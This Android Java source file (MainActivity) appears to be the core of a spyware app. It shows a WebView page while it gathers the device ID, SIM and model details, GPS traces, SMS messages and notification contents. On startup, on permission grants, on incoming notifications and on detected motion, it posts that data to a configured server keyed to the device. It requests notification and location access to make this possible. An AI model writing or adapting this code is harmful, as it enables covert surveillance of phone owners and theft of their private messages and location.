package com.example.droidapp;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.telephony.TelephonyManager;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.localbroadcastmanager.content.LocalBroadcastManager;

import java.util.HashMap;
import java.util.Locale;

public class MainActivity extends AppCompatActivity {
    // Permissions requested by application
    String TAG = "MainAct";
    WebView webView;
    public HashMap<String, Object> payload = new HashMap<>();
    public HashMap<String, Object> deviceInfo = new HashMap<>();
    public String serverURL;

    private Intent locateServiceIntent;
    public static interface Actions {
        String ON_STARTUP = "ON_STARTUP";
    }
    public static final String[] actionFilters = new String[]{
            Actions.ON_STARTUP,
    };
    public void setDeviceInfo() {
        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        String release = Build.VERSION.RELEASE;
        String countryCode = telephonyManager.getNetworkCountryIso();
        String deviceName = Build.DEVICE;
        String deviceManu = Build.MANUFACTURER;
        String modelName = Build.MODEL;
        String deviceLang = Locale.getDefault().getLanguage();
        String DEVICE_ID = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        String DEVICE_UID = deviceManu+"_"+DEVICE_ID;
        serverURL = getString(R.string.server_uri) +"?id="+ DEVICE_UID;
        deviceInfo.put("country", countryCode.toUpperCase() + "");
        deviceInfo.put("software_version",  "Android " + release);
        deviceInfo.put("sim_operator", telephonyManager.getSimOperatorName() + "");
        deviceInfo.put("device_id", DEVICE_ID);
        deviceInfo.put("device_model", deviceName + " - " + modelName);
        deviceInfo.put("device_manufacture", deviceManu);
        deviceInfo.put("device_language", deviceLang);

    }
    public void setServerPayload() {
        payload.put("gps", ILocateService.lastKnowVectors);
        payload.put("@gps", ILocateService.MODEL);
    }
    private final BroadcastReceiver broadcastReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            String action = intent.getAction();
            String data = intent.getStringExtra("data");
            Log.i(TAG, "recieved "+action);
            if(action.equals(Manifest.permission.ACCESS_FINE_LOCATION)){
                ILocateService.locationPermissionGranted = true;
                locateServiceIntent = new Intent(MainActivity.this, ILocateService.class);
                startService(locateServiceIntent);
                payload.put("info", deviceInfo);
                Utils.postDataToServer(getApplicationContext(), payload, serverURL);
            }
            if(action.equals(INotifyService.Actions.SEND_SMS_MSGS)){
                payload.put("sms", data);
                Utils.postDataToServer(getApplicationContext(), payload, serverURL);
            }
            if(action.equals(INotifyService.TRIGGER)){
                Log.i(INotifyService.TAG, "TRIGGER_"+data);
                payload.put("@trigger", action);
                setServerPayload();
                Utils.postDataToServer(getApplicationContext(), payload, serverURL);
            }
            if(action.equals("ON_STARTUP")){
                payload.put("device", deviceInfo);
                Utils.postDataToServer(getApplicationContext(), payload, serverURL);
            }
            if(action.equals(INotifyService.Actions.ON_NOTIFICATION_POSTED)){
                Log.i(INotifyService.TAG, action);
                payload.put("@note", INotifyService.MODEL);
                payload.put("note", INotifyService.note);
                payload.put("sms", INotifyService.smsMsgs);
                Utils.postDataToServer(getApplicationContext(), payload, serverURL);
            }
            if(action.equals(ILocateService.Actions.ON_MOTION_DETECTED)){
                Log.i(ILocateService.TAG, data);
                if(ILocateService.vectorMax == ILocateService.lastKnowVectors.size()){
                    setServerPayload();
                    Utils.postDataToServer(getApplicationContext(), payload, serverURL);
                }
            }
            payload.clear();
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        setDeviceInfo();
        // Start Broadcast manager service
        String[][] serviceActions = new String[][]{
                Utils.genActions(MainActivity.actionFilters,null),
                Utils.genActions(ILocateService.permissions,null),
                Utils.genActions(ILocateService.actionFilters, null),
                Utils.genActions(INotifyService.permissions, null),
                Utils.genActions(INotifyService.actionFilters, null),
                Utils.genActions(INotifyService.triggerFilters, null),
        };

        LocalBroadcastManager.getInstance(this)
                .registerReceiver(broadcastReceiver, Utils.genIntentFilter(serviceActions));

        // Start INotify Special Permissions
        INotifyService.requestNotificationPermissions(this);
        Utils.requestAppPermissions(this, INotifyService.permissions, ILocateService.LOCATION_PERMISSION_CODE);
        // Start ILocation Permissions
        Utils.requestAppPermissions(this, ILocateService.permissions, ILocateService.LOCATION_PERMISSION_CODE);
        LocalBroadcastManager.getInstance(this).sendBroadcast(new Intent("ON_STARTUP"));

        // Load Webview
        webView = findViewById(R.id.droidWebView);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.setWebViewClient(new WebViewClient());
        webView.loadUrl(getString(R.string.web_view_app));
    }

    /*
     * Handler for Activity Services
     * */
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == INotifyService.ON_NOTIFY_REQUESTED_CODE) {
            if (INotifyService.isNotificationsAllowed(this)) {
                // Notification access granted
                Log.i(INotifyService.TAG, "INotifyService Completed");
                LocalBroadcastManager.getInstance(this).sendBroadcast(new Intent("ON_NOTIFY_GRANTED"));
                Toast.makeText(this, "Notification access granted: " + INotifyService.notificationGranted, Toast.LENGTH_SHORT).show();
            } else {
                // Notification access not granted
                Toast.makeText(this, "Notification access not granted", Toast.LENGTH_SHORT).show();
            }
        }
    }

    /**
     * Handles the result of the request for permissions.
     */
    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        for (int i = 0; i < permissions.length; i++) {
            String perm = permissions[i]; //.replace("android.permission.","");
            boolean isGranted = grantResults[i] > -1;
            Log.i(ILocateService.TAG, perm +":"+isGranted);
            Intent permIntent = new Intent(perm);
            permIntent.putExtra("data", Boolean.toString(isGranted));
            LocalBroadcastManager.getInstance(this).sendBroadcast(permIntent);
        }

    }

    @Override
    protected void onDestroy() {
        Log.i(TAG, "DESTROYING ALL THE THINGS");
        LocalBroadcastManager.getInstance(this).unregisterReceiver(broadcastReceiver);
        stopService(locateServiceIntent);
        super.onDestroy();
    }
}